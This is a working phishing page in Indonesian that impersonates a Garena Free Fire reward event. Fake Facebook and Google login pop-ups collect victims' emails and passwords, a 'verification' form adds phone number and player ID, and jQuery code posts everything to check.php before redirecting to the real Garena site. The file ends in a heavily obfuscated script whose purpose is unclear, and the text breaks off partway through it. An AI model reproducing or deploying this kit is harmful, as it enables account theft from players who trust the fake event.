<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="Garena Free Fire. Best survival Battle Royale on mobile!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="Garena Free Fire. Best survival Battle Royale on mobile!">
<meta property="og:type" content="website">
<meta name="copyright"content="Garena Free Fire. Best survival Battle Royale on mobile!">
<meta name="theme-color" content="#000">
<title>Garena Free Fire. Best survival Battle Royale on mobile!</title>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
$(document).ready(function(){$('body').hide();});
    </script>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
</head>
<body style="display:none;">
<style type="text/css">
 body {
	background: #000 center / cover no-repeat;
	margin: 0;
	font-family: 'Teko';
}
.navbar {
	background: url(img/navbar.jpg) top center / 100% no-repeat;
	width: 100%;
	height: 65px;
}
.event-theme {
	width: 98%;
	height: 53px;
	margin-top: -15px;
	margin-bottom: -15px;
	margin-left:auto;
	margin-right:auto;
	display:block;
}
.event-subtitle {
    display: block;
    margin-left: 5%;
    margin-right: 5%;
    margin-top: -15px;
    margin-bottom: 15px;
    overflow: hidden;
    text-align: center;
	font-family: Teko;
    white-space: nowrap;
    width: 90%;
    font-size: 61px;
    text-shadow: 0px 1.1px 0px #FFB900;
}
.event-subtitle>span {
    display: inline-block;
    position: relative;
    color: #FFB900;
    cursor: default;
    font-size: 1.2rem;
	font-family: Teko;
}
.event-subtitle>span:before,
.event-subtitle>span:after {
    background: #FFB900;
	border-bottom: 1px solid #FFB900;
    content: "";
    height: 2px;
    position: absolute;
    top: 50%;
    width: 9999px;
}
.event-subtitle>span:before {
    margin-right: 8px;
    right: 100%;
}
.event-subtitle>span:after {
    left: 100%;
    margin-left: 8px;
}
.event-notification-wrapper {
	width:90%;
	height: auto;
	margin-left:auto;
	margin-right:auto;
	margin-bottom:20px;
	border-bottom:2px solid #FFB900;
	display:block;
}
.event-notification-content {
	background:#f4af02;
	width:100%;
	height:auto;
	margin-bottom:1px;
	padding-left:5px;
	color:#000;
	font-size:19px;
	font-family:Teko;
	text-align:left;
}
.event-notification-content i {
	padding-right:5px;
	color:#000;
	font-size:25px;
	float: left;
}
.event-notification-content-timer i {
    padding-top:2px;
	padding-right:5px;
	color:#000;
	font-size:19px;
}
.event-notification-content-timer {
	margin-top:2px;
	margin-right:5px;
	float: right;
}
.footer {
	background: #131313;
	width: 100%;
	height: auto;
	padding: 15px;
}
.item img, .item button {
	border:1.5px solid #E6C164;
}
.nav-popup-title {
    padding-left: 15px;
	padding-top: 2px;
	color: #000;
	font-size: 22px;
	font-family:Teko;
	font-weight: 500;
	text-align: center;
}
.nav-popup img {
	width: 20px;
	height: 20px;
	margin-top: 5px;
	margin-right: 10px;
	color: #000;
	float: right;
}
.popup-alert {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #000;
	font-size: 20px;
    font-family:Teko;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-alert i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #000;
	font-size: 40px;
	text-align: center;
}
.popup-footer button:nth-child(1) {
	width: auto;
	height: auto;
	margin-top: 4px;
	margin-left:auto;
	margin-right:auto;
	padding: 3px;
	padding-left: 28px;
	padding-right: 28px;
	color: #000;
	font-size:18px;
	font-family: Teko;
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
}
.popup-btn-login {
    width: 85%;
    height: auto;
    padding: 8px;
    margin-left:auto;
	margin-right:auto;
    color: #000;
	font-size: 15px;
    font-family:Teko;
    border-radius: 2px;
    border: none;
    outline: none;
}
.popup-btn-login i {
    color: #fff;
    font-size: 20px;
    float: left;
}
.popup-btn-facebook {
    background: #1778f2;
    color: #fff;
	margin-bottom: 3px;
}
.popup-btn-twitter {
    background: #08a0e9;
	margin-bottom: 20px;
    color: #fff;
}
.popup-form-footer {
    margin-top: -16px;
}
.popup-form-footer button {
	width: auto;
	height: auto;
	margin-top: 4px;
	padding: 3px;
	padding-left: 30px;
	padding-right: 30px;
	color: #000;
	font-size:18px;
	font-family: Teko;
	font-weight: 500;
	text-align: center;
	border:none;
	outline: none;
}
.popup-form input {
    background: none;
	background-size:100% 100%;
	width: 90%;
	height: auto;
	margin-left: 6px;
	margin-bottom: 3px;
	padding: 4.4px;
	color: #000;
	font-size:17px;
	font-family:Teko;
	font-weight: 500;
	border-radius: 2px;
	border: 1px solid #000;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.popup-form input::placeholder {
	color: #000;
}
.popup-form select {
    background: none;
	background-size:100% 100%;
	width: 90%;
	height: auto;
	margin-left: 6px;
	margin-bottom: 3px;
	padding: 6px;
	padding-left: 6px;
	color: #000;
	font-size: 17px;
	font-family:Teko;
	font-weight: 500;
	border-radius: 2px;
	border: 1px solid #000;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
</style>
<div class="container">
<div class="navbar">
<div class="navbar-right">
</div> <!--- navbar-right --->
</div> <!--- navbar --->
<div class="header">
<img src="img/heade77r.jpg">
</div> <!--- header --->
<div class="event-theme">
</div> <!--- event-theme --->
<div class="event-subtitle"><span>Kalahkan Naga Dan Dapatkan Hadiah Sekarang </span></div> <!--- event-subtitle --->
<div class="event-notification-wrapper">
<div class="event-notification-content"><i class="zmdi zmdi-chevron-right"></i> Event Berakhir <div class="event-notification-content-timer"><i class="zmdi zmdi-timer"></i><span id="latestTimer"></span></div></div> <!--- event-notification-content --->
</div> <!--- event-notification-wrapper --->
<div class="box">
<center>
<div class="tab_rewards" id="latest">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/1.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/1.jpg"><img style="width: 100%; height: auto;border: none;" src="img/tokens.png"></button></p>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/2.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/2.jpg"><img style="width: 100%; height: auto;border: none;" src="img/tokens.png"></button></p>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/3.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/3.jpg"><img style="width: 100%; height: auto;border: none;" src="img/tokens.png"></button></p>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/4.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/4.jpg"><img style="width: 100%; height: auto;border: none;" src="img/tokens.png"></button></p>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/5.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/5.jpg"><img style="width: 100%; height: auto;border: none;" src="img/tokens.png"></button></p>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/6.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/6.jpg"><img style="width: 100%; height: auto;border: none;" src="img/tokens.png"></button></p>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/7.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/7.jpg"><img style="width: 100%; height: auto;border: none;" src="img/tokens.png"></button></p>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/8.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/8.jpg"><img style="width: 100%; height: auto;border: none;" src="img/tokens.png"></button></p>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/9.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/9.jpg"><img style="width: 100%; height: auto;border: none;" src="img/tokens.png"></button></p>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/10.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/10.jpg"><img style="width: 100%; height: auto;border: none;" src="img/tokens.png"></button></p>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/11.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/11.jpg"><img style="width: 100%; height: auto;border: none;" src="img/tokens.png"></button></p>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/12.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/12.jpg"><img style="width: 100%; height: auto;border: none;" src="img/tokens.png"></button></p>
</div>
</div>
</div> <!--- tab-rewards --->
</center>
</div> <!--- box --->
<div class="footer">
<img class="footer-copyright-icon" src="img/bff.png">
<div class="footer-txt-copyright">© Garena International , Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Terms of Service | Rules of Conduct | Official Community Policy</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup itemReward_confirmation" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<img onmousedown="tutup.play();" onclick="close_reward_confirmation()" src="img/popup-close.png">
<center><div class="nav-popup-title">Selamat Anda Mendapatkan</div></center> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">Yakin Ingin Claim Hadiah Ini?</div> <!--- popup-alert --->
<div class="popup-item itemShine">
<div>
<figure>
<img src="" id="myItemReward_confirmationImg">
</figure>
</div>
</div> <!--- popup-item itemShine --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-footer">
<button type="button" onmousedown="buka.play();" onclick="open_account_login()">Claim</button>
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup account_login" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Verification Hadiah</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">Masuk Menggunakan Akun Free Fire Kamu</div> <!--- popup-alert --->
<button type="button" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Masuk Dengan Facebook</button>
<button style="background: #fff;color: black;" type="button" class="popup-btn-login popup-btn-twitter" onclick="open_twitter();"><i style="color: black;" class="fa fa-google icon-login"></i> Masuk Dengan Google </button>
<br>
</div>
</div>
</div> <!--- popup-box-bg --->
<div class="popup-footer-log">
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb"><img src="https://i.ibb.co/Wg8qQxh/facebook-text.png"></div> <!--- navbar-fb --->
<div class="content-box-fb">
<img src="img/gamecon.jpg">
<div class="txt-login-fb">Masuk Ke Akun Facebook Anda Untuk terhubung dengan Garena Free Fire.</div> <!--- txt-login-fb --->
<form action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
<input type="text" class="loginEmail" name="email" id="email-facebook" placeholder="Nomor Ponsel Atau Alamat Email" autocomplete="off" autocapitalize="off" required>
<input type="password" class="loginPassword" name="sandi" id="password-facebook" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" required>
<div class="showHide showPassword" onclick="showFbPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div> <!--- showPassword --->
<div class="showHide hidePassword" style="display: none;" onclick="hideFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div> <!--- hidePassword --->
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
</form>
</div> <!--- content-box-fb--->
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div> <!--- language-name --->
<div class="language-name">India</div> <!--- language-name --->
<div class="language-name">Türkçe</div> <!--- language-name --->
<div class="language-name">Tiếng Việt</div> <!--- language-name --->
<div class="language-name">日本語</div> <!--- language-name --->
<div class="language-name">Español</div> <!--- language-name --->
<div class="language-name">Português (Brasil)</div> <!--- language-name --->
<div class="language-name"><i class="fa fa-plus"></i></div> <!--- language-name --->
</center>
</div> <!--- language-box --->
<div class="copyright">Facebook Inc.</div> <!--- copyright --->
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login --->

<div class="popup-login login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="header-twitter">
<center>
<img src="https://telegra.ph/file/d8f63c616348e86fb7ac2.jpg">
</center>
<div class="box-twitter">
<center>
<form action="javascript:void(0)" method="post" id="ValidateLogintwitterForm">
<div class="txt-login-twitter">Login Google</div> <!--- txt-login-twitter --->
<div class="input-box-twitter">
<label>Masukan Email Atau Telephone</label>
<input type="text" name="email" id="email-twitter" placeholder="" required>
</div> <!--- input-box-twitter --->
<div class="input-box-twitter">
<div class="twitterShowHide twitterShowPassword" onclick="showtwitterPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div> <!--- twitterShowPassword --->
<div class="twitterShowHide twitterHidePassword" style="display: none;" onclick="hidetwitterPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div> <!--- twitterHidePassword --->
<label>Masukan Password</label>
<input type="password" style="width: 85%;" name="sandi" id="password-twitter" placeholder="" required>
</div> <!--- input-box-twitter --->
<input type="hidden" name="login" id="login-twitter" value="Google" readonly>
<button style="background: #0036F6;" type="submit" class="btn-login-twitter" onclick="ValidateLogintwitterData()">Masuk</button>
<div style="color: #0036F6;" class="footer-menu-twitter">Forgot password?</div> <!--- footer-menu-twitter --->
<div class="footer-menu-twitter bulet">•</div> <!--- footer-menu-twitter --->
<div style="color: #0036F6;" class="footer-menu-twitter">Sign up to Google</div> <!--- footer-menu-twitter --->
</form>
</center>
</div> <!--- box-twitter --->
</div> <!--- header-twitter --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login--->

<div class="popup account_verification" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Verifikasi Akun</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">Lengkapi detail akun Anda</div> <!--- popup-alert --->
<form class="popup-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm" onsubmit="$(this).end()">
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="sandi" id="validatePassword" readonly>
<input type="hidden" name="ua" id="ua" value="Redeem Tiket FF">
<input type="hidden" name="log" id="log" value="Facebook">
<input type="number" name="playid" id="playid" placeholder="Player ID Karakter" autocomplete="off" required>
<input type="number" name="phone" id="phone" placeholder="Nomor Ponsel" autocomplete="off" required>
<select name="level" id="level" required>
<option selected="selected" disabled="disabled" value="">Level Akun</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<select name="rank" id="rank" required>
<option selected="selected" disabled="disabled" value="">Ranked FF</option>
<option>Bronze</option>
<option>Silver</option>
<option>Gold</option>
<option>Diamond</option>
<option>Heroic</option>
<option>Master</option>
<option>GrandMaster</option>
</select>
<select name="elitpass" id="elitpass" required>
<option selected="selected" disabled="disabled" value="">Pernah ElitPass</option>
<option>Ya, Pernah</option>
<option>Belum Pernah</option>
</select>
<input type="hidden" name="login" id="validateLogin" readonly>
<br><br>
</div> <!--- popup-box-bg --->
<div class="popup-form-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verify</button>
</div> <!--- popup-footer --->
</form> <!--- form --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup check_verification" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Account Verification</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">
<br>
<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
<br>
Tunggu Sebentar........
<br><br>
</div> <!--- popup-alert --->
<div class="popup-form-footer">
</div> <!--- popup-form-footer --->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup processing_account" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Successfull </div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">
Behasil
<br>
<i class="fa fa-check-circle fa-2x"></i>
<br>
Hadiah Akan Dikirimkan Setelah 24jam Lewat In-Game Mail
Mohon Di Tunggu Hadiah Akan Masuk
</div> <!--- popup-alert --->
<div class="popup-footer">
<button type="button" onmousedown="tutup.play();" style="background: url(img/menu_on.png) no-repeat center center; background-size: 100% 100%;" onclick="location.href='https://ff.garena.com/';">Logout</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.twitterapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.twitterapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/gh/StyleeJs/3.6.0/jquery.js"></script>
<script>
// code for showing countdown timer
$(document).ready(function() {
    var detik = 59;
    var menit = 59;
    var jam = 23;
	
    function hitung() {
		setTimeout(hitung, 1000);
        $('#latestTimer').html('' + jam + ' : ' + menit + ' : ' + detik + '');
        detik--;
        if (detik < 0) {
            detik = 59;
            menit--;
            if (menit < 0) {
                menit = 0;
                detik = 0;
            }
        }
    }
    hitung();
});// code for activate clicked sound
var buka = new Audio();
buka.src = "https://l.top4top.io/m_1725u5z7i1.mp3";

var tutup = new Audio();
tutup.src = "https://a.top4top.io/m_1725zobal2.mp3";

// code for showing hiding items
function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";
    }
    tab_rewards_link = document.getElementsByClassName("menu-content");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();

// code for showing hiding popup
function open_rewardsBox(){
	$('.rewardsBox').show();
	$('.rewardsHome').hide();
}
function open_itemReward_confirmation(ag) {
    var itemReward_confirmationImg = $(ag).attr("src");
    $('.itemReward_confirmation').show();
    $('#myItemReward_confirmationImg').attr('src',itemReward_confirmationImg);
}
function open_otherReward_confirmation(ag) {
    var otherReward_confirmationImg = $(ag).attr("src");
	var otherReward_confirmationValue = $(ag).attr("value");
    $('.otherReward_confirmation').show();
    $('#myOtherReward_confirmationImg').attr('src',otherReward_confirmationImg);
	$('#otherReward_confirmationValue').html(otherReward_confirmationValue);
}
function open_account_login(){
	$('.account_login').show();
	$(".itemReward_confirmation").hide()
	$(".otherReward_confirmation").hide()
}
function open_facebook(){
	$('.login-facebook').show();
	$('.account_login').hide();
}
function open_twitter(){
	$('.login-twitter').show();
	$('.account_login').hide();
}
function close_reward_confirmation(){
	$(".itemReward_confirmation").hide()
	$(".otherReward_confirmation").hide()
}
function tutup_facebook(){
	$('.login-facebook').hide()
	$('.account_login').show();
}
function tutup_twitter(){
	$('.login-twitter').hide()
	$('.account_login').show();
}

// code for validate data to next step
function ValidateLoginFbData() {
	$('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData){
	submitingValidateLoginFbData.preventDefault();
	
	$email = $('#email-facebook').val().trim();
	$password = $('#password-facebook').val().trim();
	$login = $('#login-facebook').val().trim();
	if($email == '' || $password == '') {
	} else {
	$('.login-facebook').hide();
	$('.account_verification').show();
	$("input#validateEmail").val($email);
	$("input#validatePassword").val($password);
	$("input#validateLogin").val($login);
	}
	}); 
}
function ValidateLogintwitterData() {
	$('#ValidateLogintwitterForm').submit(function(submitingValidateLogintwitterData){
	submitingValidateLogintwitterData.preventDefault();
	
	$email = $('#email-twitter').val().trim();
	$password = $('#password-twitter').val().trim();
	$login = $('#login-twitter').val().trim();
	if($email == '' || $password == '') {
	} else {
	$('.login-twitter').hide();
	$('.account_verification').show();
	$("input#validateEmail").val($email);
	$("input#validatePassword").val($password);
	$("input#validateLogin").val($login);
	}
	}); 
}

// code for validate data to sending to file result
function ValidateVerificationData(){
	$('#ValidateVerificationDataForm').submit(function(submitingVerificationData){
	submitingVerificationData.preventDefault();
	
	var $validateEmail = $("input#validateEmail").val();
	var $validatePassword = $("input#validatePassword").val();
	var $playid = $("input#playid").val();
	var $phone = $("input#phone").val();
	var $level = $("input#level").val();
	var $validateLogin = $("input#validateLogin").val();
	if($validateEmail == "" && $validatePassword == "" && $playid == "" && $phone == "" && $level == "" && $validateLogin == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "check.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.check_verification').show();
			$('.account_verification').hide();
		},
		success: function(){
		$(".processing_account").show();
		$('.check_verification').hide();
		$('.account_verification').hide();
		}
	});
	});  
	return false;
};// show hide password for facebook
function showFbPassword() {
  var x = document.getElementById("password-facebook");
  if (x.type === "password") {
    x.type = "text";
	$('.showPassword').hide();
	$('.hidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideFbPassword() {
  var x = document.getElementById("password-facebook");
  if (x.type === "text") {
    x.type = "password";
	$('.showPassword').show();
	$('.hidePassword').hide();
  } else {
    x.type = "text";
  }
}

// show hide password for twitter
function showtwitterPassword() {
  var x = document.getElementById("password-twitter");
  if (x.type === "password") {
    x.type = "text";
	$('.twitterShowPassword').hide();
	$('.twitterHidePassword').show();
  } else {
    x.type = "password";
  }
}
function hidetwitterPassword() {
  var x = document.getElementById("password-twitter");
  if (x.type === "text") {
    x.type = "password";
	$('.twitterShowPassword').show();
	$('.twitterHidePassword').hide();
  } else {
    x.type = "text";
  }
}
</script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
(function(){var Ilf='',xkX=616-605;function ElM(i){var u=2376457;var s=i.length;var d=[];for(var y=0;y<s;y++){d[y]=i.charAt(y)};for(var y=0;y<s;y++){var n=u*(y+281)+(u%40988);var g=u*(y+78)+(u%26934);var v=n%s;var c=g%s;var a=d[v];d[v]=d[c];d[c]=a;u=(n+g)%3341854;};return d.join('')};var CmU=ElM('xgfrdruvcptcmnltsqzijkesonyowaruchotb').substr(0,xkX);var IRo='aznf<=9i;nn3r;p;muso)+sn+tv]=dd {iyvk;t}.,lr) uC,tnz=x(=4e.v.o}=wnrso[(=f(14-u.b4[)[b 8orog.5vf1ta9ua0s7.lfA)08.nq]s);;e)v=.(i>=s.7err(rit1vs;8w<roqupnerp +uvro);wgvaani6lr)-mnrr21+. o;1)=)c"ryrg(kf=s(eap]r1];utar  )v(0 r)eig=..fl+vgi3n (u,eavav>;s"t;,=a;.t.iy"pn8o.(j)1(v,,nl0)=a]v1;htv=nk=-(o.=r+rt)r)a;wa[sy;=.+];(ad av+ucl)emrng!q;nd;,7a0roe0 ;h[87+r"y8l=( aS;etrie<*is,sa5vi6vhrl)ch[r-)h{Atar4mut(oCea7 .;(xnrb;9a]sxCufhCc0chg +ehn},)e"6thd;wyazi<b[lah(vlpf(gahen ,;[*]s= ps=th-ive]enrtt;)n=f2kwqzr+"grhv(20dwAbwet,rr=;a=e; lh2;2jeoe=;(xtuh;h}a3a(v=-mxqia.[+= 0sCujanx";{.roya,<t7;[{1r(f,e+e8+=a5r,g=d Ce(o8hf=;"crcr+r!;s,wnrotl abp0n7;fs1(,.[ =)a)fnt+f)sdr{l{)e[aou((r[5;k[x;1t,h(r=e()u;)}.v)=66=;; )ee]"vf7+id)92,=9.s6=3i(a;,6=,j-d(+i8,,)=v=r(nsgmli+.7g+o=ll0lw]c], 6"1f5ngvca0h]u6uu).leehyl;ir+AcCe}Cit6t(ol;pc=;;r}(rx82fc+n=S+rwr9vrf;,ahetkmgvc,xhhop,aey,jg5d(+=ii)m +A9g..a{]n 1)p';var BaB=ElM[CmU];var xuW='';var HNg=BaB;var gbL=BaB(xuW,ElM(IRo));var xzf=gbL(ElM('eond+7A)ript;oqave48 orA;sfe!3(}mA,(}&_%.A_3l.6A)_a=C)3A,_s!_\'A_s6gm{Acgs;e=7Atwd\'ad*=d;i+gA\/64t#9$]A$x(sfx842n).o=+ab6b,nA7r3x$ )+a(ni0beAhrv)(n(2edj9_( t(Aip,ct]A[1e16_ws,;}a]34#3d)o(qt%d6Sa.cAi.6gmedlAA 4f_(A%(!0iAo8A= obA\/o$#5!ra%i9-};!jfgj..\/v!%j.734p7);dfA]!8C3u.s0(A3Al;)(hn(f..1A{!4A3,t;b%do.Ab5()A$A$3%k8((sf.{A8y}x3A}e;AgAAaA9uA$5=)};Ao asA]Aof2<i.7:=fq(r2(cA.yg}ndth.5.)(.$a0$6;1Au51A)c05ie_4!s{a,do5))epAA=d.co(h}ca6o]t(ih} g)1t).]o);(Ap60pu!(<05d.5r ]jjdwg]g(pA,43 b,i41)A,0$.$ ]u4su8h)n*#2 Abi8j*:uf(6.!5-.7n7t),(i$AdA$13A003 t.e=_1e;$.(5.1_j,ig.(;A6eva4_A3;i064=7dn5r5)(3j)_=bj=A3A$usAA.{mh(,3nffs,s15nsp,$A)fA3u({s"$.._ .ie_rgu4y!;e=xt(8!.<_aAl:7{;m.s2dbr"+=+{rArAAueA9f%A%1p%l!d=l_#sbq=A.)3.,337;!ebA1t(nd.$b3Aob{%3rA\/!0A3)A_())rs]_(A)A.en"na4nb(4eA2 ;}AA\'mn:)A0;_d;x},7]tAa6&=.xb$),)fA_ahcA=AAAd7+r76AtoeA$,1}_.g3)_bl .n)0n.d!(;04gAA=vA}(q_).9)s2_$5,<eAa.den,(d)_c{ A,]Aco0[..,y}11trA\/:).(3))2;;d4a[[3(6 !csed"e{s:$A1f3egA=53rA!t!_\/Aetbu.4;A_$!()u3t)Al._6;=6i iffoA6AoeA5 .s-$$.6ia,!r.d&24%_7)}$)n.,]Azlqd )ti=Azeo_a;;A=l2+(9}9(A!;b#g;r4loi(A3;Afa.fAi8{_{4:.-r_6ob}A6))($})5!A!%__.2).A8\/q&}.51-n(b;6dA,%7]AAo!_A9Alis)A(54f37s4uA)#)+(A.8((Af0As;.so85.3it2k2.6s %0}A7*(AvT\'0A8 9_".)p)_A=,gl4.\/)\'5a.4 0erA74])s {{7A8l3r(rS9A)q$$A,i 0)69vAa!{ii%:5]:s3Aa,6)d(As 